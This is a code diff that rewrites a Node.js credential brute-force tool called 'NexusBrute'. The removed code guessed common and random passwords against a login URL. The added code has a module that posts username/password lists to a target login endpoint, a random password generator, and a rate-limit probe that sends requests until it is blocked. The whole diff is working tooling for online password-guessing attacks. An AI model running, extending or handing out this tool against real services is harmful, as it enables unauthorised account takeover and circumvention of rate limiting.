@@ -1,121 +1,138 @@
-const fetch = require('node-fetch');
 const fs = require('fs').promises;
-const config = require('./config.json');
+const axios = require('axios');
+const chalk = require('chalk');
 
-const loginUrl = config.loginUrl;
-const usernames = config.usernames;
-const characters = config.characters;
-const passwordConfig = config.passwordConfig;
+const CONFIG_FILE = 'config.json';
+const RESULTS_JSON = 'brute_results.json';
+const RESULTS_CSV = 'brute_results.csv';
 
-const results = [];
-
-function generatePassword(length) {
-  const allChars = characters.lowercase + characters.uppercase + characters.numbers + characters.special;
-  let password = '';
-  for (let i = 0; i < length; i++) {
-    const randomIndex = Math.floor(Math.random() * allChars.length);
-    password += allChars[randomIndex];
-  }
-  return password;
-}
-
-function generateCommonPatterns(username) {
-  return [
-    username,
-    username + '123',
-    username + '2023',
-    username.toLowerCase() + '!',
-    'P@ssw0rd',
-    username.charAt(0).toUpperCase() + username.slice(1) + '123!',
-    'Welcome123!',
-    'Admin' + username.slice(0, 3),
-    'password123',
-    'qwerty123',
-    'letmein'
-  ];
-}
-
-async function tryLogin(username, password, retryCount = 0) {
+// Load config
+async function loadConfig() {
   try {
-    const response = await fetch(loginUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        username: username,
-        password: password
-      })
-    });
-    const data = await response.json();
-    const isSuccess = response.status === 200 && data.success;
-
-    results.push({
-      username,
-      password,
-      status: isSuccess ? 'success' : 'failure',
-      responseCode: response.status,
-      timestamp: new Date().toISOString()
-    });
-
-    if (isSuccess) {
-      return { success: true, password };
-    } else {
-      return { success: false };
-    }
-  } catch (error) {
-    if (retryCount < passwordConfig.maxRetries) {
-      await new Promise(resolve => setTimeout(resolve, 2000));
-      return tryLogin(username, password, retryCount + 1);
-    }
-    results.push({
-      username,
-      password,
-      status: 'error',
-      responseCode: error.response?.status || 'N/A',
-      error: error.message,
-      timestamp: new Date().toISOString()
-    });
-    return { success: false };
+    const data = await fs.readFile(CONFIG_FILE);
+    return JSON.parse(data);
+  } catch (err) {
+    console.error(chalk.red('[ERROR] Failed to load config.json:', err.message));
+    process.exit(1);
   }
 }
 
-async function delay(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
+// Save results
+async function saveResults(results) {
+  try {
+    await fs.writeFile(RESULTS_JSON, JSON.stringify(results, null, 2));
+    const csv = ['Operation,Target,Result,Timestamp,Error']
+        .concat(results.map(r => `"${r.operation}","${r.target}","${r.result}","${r.timestamp}","${r.error || ''}"`))
+        .join('\n');
+    await fs.writeFile(RESULTS_CSV, csv);
+    console.log(chalk.green('[SUCCESS] Results saved to brute_results.json and brute_results.csv'));
+  } catch (err) {
+    console.error(chalk.red('[ERROR] Failed to save results:', err.message));
+  }
 }
 
-async function saveResults() {
-  const csv = ['username,password,status,responseCode,timestamp,error'];
-  results.forEach(r => {
-    csv.push(`${r.username},${r.password},${r.status},${r.responseCode},${r.timestamp},${r.error || ''}`);
-  });
-  await fs.writeFile('brute_force_results.csv', csv.join('\n'));
-}
+// Smart Brute module
+async function smartBrute(config) {
+  const { targetUrl, usernames, passwords, delayMs, maxAttempts } = config.smartBrute;
+  const results = [];
+  let attempts = 0;
 
-async function index() {
   for (const username of usernames) {
-    const commonPatterns = generateCommonPatterns(username);
-    const allPasswords = [...commonPatterns];
-
-    for (let i = 0; i < passwordConfig.maxAttemptsPerUser - commonPatterns.length; i++) {
-      const length = Math.floor(Math.random() * (passwordConfig.maxLength - passwordConfig.minLength + 1)) + passwordConfig.minLength;
-      allPasswords.push(generatePassword(length));
-    }
-
-    let attemptCount = 0;
-    for (const password of allPasswords) {
-      attemptCount++;
-      const result = await tryLogin(username, password);
-      if (result.success) {
-        break;
+    for (const password of passwords) {
+      if (attempts >= maxAttempts) break;
+      try {
+        const response = await axios.post(targetUrl, { username, password }, { timeout: 5000 });
+        results.push({
+          operation: 'smart_brute',
+          target: `${username}:${password}`,
+          result: response.status === 200 ? 'Success' : 'Failed',
+          timestamp: new Date().toISOString(),
+          error: ''
+        });
+        console.log(chalk.cyan(`[ATTEMPT] ${username}:${password} -> ${response.status}`));
+      } catch (err) {
+        results.push({
+          operation: 'smart_brute',
+          target: `${username}:${password}`,
+          result: 'Failed',
+          timestamp: new Date().toISOString(),
+          error: err.message
+        });
+        console.error(chalk.red(`[ERROR] ${username}:${password} -> ${err.message}`));
       }
-      await delay(passwordConfig.delayMs);
+      await new Promise(resolve => setTimeout(resolve, delayMs));
+      attempts++;
     }
   }
-
-  await saveResults();
+  await saveResults(results);
 }
 
-index().catch(async err => {
-  await saveResults();
-});
+// Password Generator module
+function passwordGenerator(config) {
+  const { length, count, useSpecialChars } = config.passwordGenerator;
+  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' + (useSpecialChars ? '!@#$%^&*' : '');
+  const results = [];
+
+  for (let i = 0; i < count; i++) {
+    let password = '';
+    for (let j = 0; j < length; j++) {
+      password += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    results.push({
+      operation: 'password_gen',
+      target: 'generated_password',
+      result: password,
+      timestamp: new Date().toISOString(),
+      error: ''
+    });
+  }
+  saveResults(results);
+  console.log(chalk.green(`[SUCCESS] Generated ${count} passwords`));
+}
+
+// Rate Limit Checker module
+async function rateLimitChecker(config) {
+  const { targetUrl, maxRequests, intervalMs } = config.rateLimitChecker;
+  const results = [];
+  let blocked = false;
+
+  for (let i = 0; i < maxRequests; i++) {
+    try {
+      const response = await axios.get(targetUrl, { timeout: 5000 });
+      results.push({
+        operation: 'rate_limit',
+        target: targetUrl,
+        result: `Request ${i + 1}: ${response.status}`,
+        timestamp: new Date().toISOString(),
+        error: ''
+      });
+      console.log(chalk.cyan(`[ATTEMPT ${i + 1}] Status: ${response.status}`));
+    } catch (err) {
+      blocked = true;
+      results.push({
+        operation: 'rate_limit',
+        target: targetUrl,
+        result: `Request ${i + 1}: Failed`,
+        timestamp: new Date().toISOString(),
+        error: err.message
+      });
+      console.error(chalk.red(`[ERROR] Request ${i + 1}: ${err.message}`));
+      break;
+    }
+    await new Promise(resolve => setTimeout(resolve, intervalMs));
+  }
+  console.log(chalk.yellow(blocked ? '[INFO] Rate limit detected!' : '[INFO] No rate limit detected.'));
+  await saveResults(results);
+}
+
+// Main function
+async function main() {
+  const config = await loadConfig();
+  console.log(chalk.green('[NexusBrute] Initialized with config:', JSON.stringify(config, null, 2)));
+
+  await smartBrute(config);
+  await passwordGenerator(config);
+  await rateLimitChecker(config);
+}
+
+main().catch(err => console.error(chalk.red('[FATAL] NexusBrute crashed:', err.message)));
